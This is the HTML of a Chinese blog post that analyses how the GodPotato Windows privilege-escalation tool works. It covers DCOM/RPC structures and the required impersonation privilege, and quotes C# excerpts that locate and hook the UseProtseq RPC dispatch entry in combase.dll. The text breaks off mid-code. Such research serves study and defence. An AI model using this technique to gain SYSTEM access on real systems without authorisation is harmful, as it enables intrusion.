@@ -1,0 +1,804 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme="dark">
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/88082435?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/88082435?v=4">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="mingming">
+  <meta name="keywords" content>
+  
+    <meta name="description" content="概述：GodPotato 的原理分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【RPC】GodPotato原理分析">
+<meta property="og:url" content="https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="oone">
+<meta property="og:description" content="概述：GodPotato 的原理分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109151018572.png">
+<meta property="og:image" content="https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109164042225.png">
+<meta property="og:image" content="https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109170501171.png">
+<meta property="og:image" content="https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109171742594.png">
+<meta property="og:image" content="https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109171332252.png">
+<meta property="og:image" content="https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109185716896.png">
+<meta property="article:published_time" content="2025-01-09T06:54:08.875Z">
+<meta property="article:modified_time" content="2025-01-09T10:58:52.007Z">
+<meta property="article:author" content="mingming">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="RPC">
+<meta property="article:tag" content="DCOM">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109151018572.png">
+  
+  
+  
+  <title>【RPC】GodPotato原理分析 - oone</title>
+
+  <link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css">
+
+
+
+  <link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css">
+
+  <link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css">
+
+  <link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css">
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css">
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/callout_blocks.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"hodlyounger.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":"holdyounger.github.io"}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="oone" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Montarius</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax="true" style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【RPC】GodPotato原理分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-09 14:54" pubdate>
+          2025年1月9日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">【RPC】GodPotato原理分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>概述：GodPotato 的原理分析</p>
+</blockquote>
+<span id="more"></span>
+<details class="custom-callout quote" open><summary class="callout-title"><div class="callout-icon"></div><div>相关链接</div>
+<div class="callout-fold"></div></summary><div class="callout-body">
+<ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/BeichenDream/GodPotato">BeichenDream/GodPotato</a></li>
+<li>相关参考<br>
+- <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/xf555er/RedTeamNotes/blob/master/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86.md">RedTeamNotes/土豆提权原理.md at master · xf555er/RedTeamNotes </a> - 阅力值 ⭐⭐⭐⭐<br>
+- <a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.z3ratu1.top/%E4%BB%8E%E7%83%82%E5%9C%9F%E8%B1%86%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F%E5%85%A5%E9%97%A8.html">从烂土豆开始的土豆家族入门 | Z3ratu1’s blog</a></li>
+<li>RPC 相关参考<br>
+- <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.powerofcommunity.net/poc2019/James.pdf">https://www.powerofcommunity.net/poc2019/James.pdf</a></li>
+</ul>
+</div>
+</details><p></p>
+<h2 id="godpotato-简述"><a class="markdownIt-Anchor" href="#godpotato-简述"></a> GodPotato 简述</h2>
+<p>一个通过 DCOM 提权的方式。利用了 Windows rpcss 服务对 OXID 处理的漏洞进行提权操作。</p>
+<h3 id="相关说明"><a class="markdownIt-Anchor" href="#相关说明"></a> 相关说明</h3>
+<p><strong>OXID:</strong></p>
+<p>OXID（对象导出器标识符）是一个用于标识网络上 DCOM 对象的唯一数字。</p>
+<p>当一个客户端应用程序想要访问一个远程 COM 对象时，它需要使用 OXID 查询来获取对象所在服务器的信息（绑定信息），随即 RPC 服务会调用 <code>ResolveOxid2</code> 函数来解析 OXID 的查询请求，并返回绑定信息</p>
+<p></p>
+<h2 id="使用条件"><a class="markdownIt-Anchor" href="#使用条件"></a> 使用条件</h2>
+<p>适用于从 Windows Server 2012 到 Windows Server 2022，以及 Windows 8 到 Windows 11</p>
+<p>需要执行用户拥有 <code>ImpersonatePrivilege</code> 权限。</p>
+<h2 id="场景演示"><a class="markdownIt-Anchor" href="#场景演示"></a> 场景演示</h2>
+<p>编译 GodPotato 源码，运行后就可以看到 <code>nt authority\system</code>  执行的 <code>whoami</code> 输出。</p>
+<img src="/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109151018572.png" srcset="/img/loading.gif" lazyload class title="image-20250109151018572">
+<h2 id="源码分析及说明"><a class="markdownIt-Anchor" href="#源码分析及说明"></a> 源码分析及说明</h2>
+<p>主要是借助 Windows 的 <code>ImpersonateNamedPipeClient</code> 模拟。当提供服务的一方具有高权限时，就可以借助这个接口实现创建高权限的逻辑。另一边，还需要创建一个管道用来模拟访问当前管道的进程，以及一个具备高权限的进程来连接当前管道。</p>
+<h3 id="相关知识点"><a class="markdownIt-Anchor" href="#相关知识点"></a> 相关知识点</h3>
+<h4 id="rpc-相关的结构体"><a class="markdownIt-Anchor" href="#rpc-相关的结构体"></a> RPC 相关的结构体</h4>
+<p>RPC 在发起会话时，主要通过 <code>RPC_SERVER_INTERFACE</code> 结构体传递重要的参数和标识信息。</p>
+<ul>
+<li>
+<p><strong>RPC_SERVER_INTERFACE</strong> 结构体如下所示：<br>
+用于描述 RPC 服务器的接口，包含有关接口的元数据，例如接口的 <code>UUID</code>（通用唯一识别码）和版本信息</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_RPC_SERVER_INTERFACE</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> Length;<br>    RPC_SYNTAX_IDENTIFIER InterfaceId;<br>    RPC_SYNTAX_IDENTIFIER TransferSyntax;<br>    PRPC_DISPATCH_TABLE DispatchTable; <span class="hljs-comment">// RPC_DISPATCH_TABLE</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> RpcProtseqEndpointCount;<br>    PRPC_PROTSEQ_ENDPOINT RpcProtseqEndpoint;<br>    RPC_MGR_EPV __RPC_FAR *DefaultManagerEpv;<br>    <span class="hljs-type">void</span> <span class="hljs-type">const</span> __RPC_FAR *InterpreterInfo; <span class="hljs-comment">// _MIDL_SERVER_INFO_</span><br>&#125; RPC_SERVER_INTERFACE, __RPC_FAR * PRPC_SERVER_INTERFACE;<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>RPC_DISPATCH_TABLE</strong> 结构体如下所示：<br>
+用于表示 RPC 的调度表，里面包含一组函数指针，每个指针指向特定 RPC 操作的函数，此表用来定位和调用适当的 RPC 函数来响应 <code>RPCSS</code> 请求</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> DispatchTableCount;<br>    RPC_DISPATCH_FUNCTION __RPC_FAR * DispatchTable;<br>    <span class="hljs-type">int</span> Reserved;<br>&#125; RPC_DISPATCH_TABLE, __RPC_FAR * PRPC_DISPATCH_TABLE;<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>MIDL_SERVER_INFO</strong> 结构体如下所示：<br>
+<code>MIDL</code> 用于定义 RPC 接口和数据结构，它包含了 <code>DispatchTable</code>（实际函数调用表）、<code>FmtStringOffset</code>（格式字符串偏移表）和 <code>ProcString</code>（格式字符串)，其中 <code>ProcString</code> 是包含了所有 RPC 函数的格式字符串，这些格式字符串定义了每个 RPC 函数的参数类型、顺序以及其他属性，而格式字符串偏移表的每个元素就是指向 <code>procString</code> 中特定 RPC 函数的格式字符串的起始偏移量</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span>  <span class="hljs-title class_">_MIDL_SERVER_INFO_</span> <br>&#123;<br>    PMIDL_STUB_DESC             pStubDesc;<br>    <span class="hljs-type">const</span> SERVER_ROUTINE *      DispatchTable;<br>    PFORMAT_STRING              ProcString;<br>    <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *      FmtStringOffset;<br>    <span class="hljs-type">const</span> STUB_THUNK *          ThunkTable;<br>&#125; MIDL_SERVER_INFO, *PMIDL_SERVER_INFO;<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>它们三个之间的关系结构如下所示，基本包括了一次 RPC 请求过程中关键信息：</p>
+<img src="/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109164042225.png" srcset="/img/loading.gif" lazyload class title="image-20250109164042225">
+<h4 id="rpcss-服务"><a class="markdownIt-Anchor" href="#rpcss-服务"></a> RPCSS 服务</h4>
+<p>RPC <strong>RPCSS</strong> 是 Windows 系统中的一个重要服务，其全称为 <strong>Remote Procedure Call (RPC) Services</strong>。该服务主要负责管理远程过程调用（RPC）的请求和响应。其中一个使用最频繁的 GUID 就是 <code>18f70770-8e64-11cf-9af1-0020af6e72f4</code>。</p>
+<p>另外的，Windows 系统中提供 COM 能力的一个关键 DLL 就是 combase.dll。基本上所有启动的进程都加载了 combase.dll。</p>
+<h4 id="c-委托概念"><a class="markdownIt-Anchor" href="#c-委托概念"></a> C# 委托概念</h4>
+<p>C# 中一种特殊的类型，它定义了方法的签名，并可以指向任何与该签名匹配的方法。委托允许将方法作为参数传递给其他方法，或者在一个类中存储对方法的引用。类似于 C/C++ 中的函数指针，但是比函数指针更加灵活。</p>
+<h3 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析"></a> 源码分析</h3>
+<p>要了解 GodPotato 的原理，包括但不限于对上述相关知识点的了解，除此之位，还要对相关 RPC 接口、创建 COM 对象的流程、管道的连接等都要有足够的了解。下面将 2 GodPotato 的工作主要分为准备（初始化）、执行（执行 hook）、提权（创建高权限）、利用（创建进程）四个部分。</p>
+<h4 id="准备初始化"><a class="markdownIt-Anchor" href="#准备初始化"></a> 准备（初始化）</h4>
+<details class="custom-callout tip" open><summary class="callout-title"><div class="callout-icon"></div><div>需要了解的相关知识点：</div>
+<div class="callout-fold"></div></summary><div class="callout-body">
+<p>#创建 COM 对象流程 #combase #RPC 相关的结构体</p>
+</div>
+</details><p>初始化部分主要是创建了 <code>GodPotatoContext</code> 来获取 RPC 的相关信息，此类是整个 GodPotato 项目的核心。 #todo 原理有待学习。</p>
+<p>在 <code>GodPotatoContext</code> 类中，调用了 <code>InitContext()</code> 函数来进行初始化操作，获取对应参数的目标函数。</p>
+<p><code>InitContext</code> 函数内，首先获取了 <code>combase.dll</code> 模块的基址，然后在 combase.dll 模块内查找前文提到的 GUID <code>18f70770-8e64-11cf-9af1-0020af6e72f4</code>，对应 <code>combase.dll</code> 内的内容如下截图所示：</p>
+<img src="/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109170501171.png" srcset="/img/loading.gif" lazyload class title="image-20250109170501171">
+<p>这一步的操作主要是获取与 RPC 相关的接口结构 <code>RPC_SERVER_INTERFACE</code> 并解析 <code>MIDL</code>(Microsoft Interface Definition Language)。</p>
+<p>相关代码：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment">// patternStream: 60 00 00 00 70 07 F7 18  64 8E CF 11 9A F1 00 20 AF 6E 72 F4</span><br><span class="hljs-keyword">var</span> s = Sunday.Search(dllContent, patternStream.ToArray());<br><br>RPC_SERVER_INTERFACE rpcServerInterface = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(<span class="hljs-keyword">new</span> IntPtr(processModule.BaseAddress.ToInt64() + s[<span class="hljs-number">0</span>]), <span class="hljs-keyword">typeof</span>(RPC_SERVER_INTERFACE));<br>RPC_DISPATCH_TABLE rpcDispatchTable = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(rpcServerInterface.DispatchTable, <span class="hljs-keyword">typeof</span>(RPC_DISPATCH_TABLE));<br>MIDL_SERVER_INFO midlServerInfo = (MIDL_SERVER_INFO)Marshal.PtrToStructure(rpcServerInterface.InterpreterInfo, <span class="hljs-keyword">typeof</span>(MIDL_SERVER_INFO));<br>DispatchTablePtr = midlServerInfo.DispatchTable;<br>IntPtr fmtStringOffsetTablePtr = midlServerInfo.FmtStringOffset;<br>procString = midlServerInfo.ProcString;<br></code></pre></td></tr></table></figure>
+<p>上述代码的 <code>DispatchTablePtr</code> 指向的位置就是我们要 hook 的目标函数地址。该函数对应 GUID 为 <code>18f70770-8e64-11cf-9af1-0020af6e72f4</code> RPC 接口。</p>
+<p>调试模式下 <code>DispatchTablePtr</code> 指向的内容为 <code>0x00007ffff94e2ee0</code>：</p>
+<img src="/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109171742594.png" srcset="/img/loading.gif" lazyload class title="调试截图 DispatchTablePtr">
+<p>借助 RPCView 查看该 RPC 对应的 Interface，如下所示，其中第一个接口（Index 为 0）指向位置为 <code>0x00007ffff94e2ee0</code>，和通过搜索获取到的 <code>DispatchTablePtr</code> 一致。</p>
+<img src="/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109171332252.png" srcset="/img/loading.gif" lazyload class title="RPCView 截图">
+<p><code>_UseProtseq</code> 函数原型：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">UseProtseq</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">void</span> *hRpc,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">unsigned</span> __int16 wTowerId,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *pwszListenAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *pdwTCPPort,</span></span><br><span class="hljs-params"><span class="hljs-function">        tagDUALSTRINGARRAY **ppsaNewBindings,</span></span><br><span class="hljs-params"><span class="hljs-function">        tagDUALSTRINGARRAY **ppsaSecurity)</span></span><br></code></pre></td></tr></table></figure>
+<p></p>
+<p>除此之外，还要匹配目标函数 <code>_UseProtSeq</code> 的参数，通过 <strong>RPC 调度表</strong> <code>UseProtseqFunctionPtr</code> 和 <strong>格式字符串偏移表</strong> <code>UseProtseqFunctionParamCount</code> 获取。这一步的目的主要是为了 Hook 时代理函数匹配目标函数。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C#">dispatchTable = <span class="hljs-keyword">new</span> IntPtr[rpcDispatchTable.DispatchTableCount];<br>fmtStringOffsetTable = <span class="hljs-keyword">new</span> <span class="hljs-built_in">short</span>[rpcDispatchTable.DispatchTableCount];<br><br><span class="hljs-comment">// 读取RPC调度表</span><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; dispatchTable.Length; i++)<br>&#123;<br>    dispatchTable[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * IntPtr.Size);<br>&#125;<br><br><span class="hljs-comment">// 读取格式字符串偏移表</span><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; fmtStringOffsetTable.Length; i++)<br>&#123;<br>    fmtStringOffsetTable[i] = Marshal.ReadInt16(fmtStringOffsetTablePtr, i * Marshal.SizeOf(<span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">short</span>)));<br>&#125;<br>UseProtseqFunctionPtr = dispatchTable[<span class="hljs-number">0</span>];<br>UseProtseqFunctionParamCount = Marshal.ReadByte(procString, fmtStringOffsetTable[<span class="hljs-number">0</span>] + <span class="hljs-number">19</span>);<br></code></pre></td></tr></table></figure>
+<p><code>fmtStringOffsetTable</code> 数组的第一个元素表示指向第一个 RPC 函数格式字符串在 <code>procString</code> 中的起始偏移量，然后在此偏移量的基础上+19，这是因为此位置存储着 RPC 函数的参数数量，所以 <code>UseProtseqFunctionParamCount</code> 变量表示 RPC 函数的参数数量。</p>
+<p>获取到 RPC 调度表指针后，我们还需要更具参数数量，指定我们的代理函数：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">if</span> (CombaseModule == IntPtr.Zero)<br>&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">&quot;No combase module found&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dispatchTable == <span class="hljs-literal">null</span> || procString == IntPtr.Zero || UseProtseqFunctionPtr == IntPtr.Zero)<br>&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">&quot;Cannot find IDL structure&quot;</span>);<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">string delegateFunName = &quot;delegateFun&quot; + UseProtseqFunctionParamCount;</span><br><span class="hljs-comment">string funName = &quot;fun&quot; + UseProtseqFunctionParamCount;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Type delegateFunType = typeof(NewOrcbRPC).GetNestedType(delegateFunName, System.Reflection.BindingFlags.Public);</span><br><span class="hljs-comment">this.useProtseqDelegate = Delegate.CreateDelegate(delegateFunType, newOrcbRPC, funName);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// Code obfuscation support</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">4</span>)<br>&#123;<br>    delegateFun4 df4 = newOrcbRPC.fun4;<br>    useProtseqDelegate = df4;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">5</span>)<br>&#123;<br>    delegateFun5 df5 = newOrcbRPC.fun5;<br>    useProtseqDelegate = df5;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">6</span>)<br>&#123;<br>    delegateFun6 df6 = newOrcbRPC.fun6;<br>    useProtseqDelegate = df6;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span 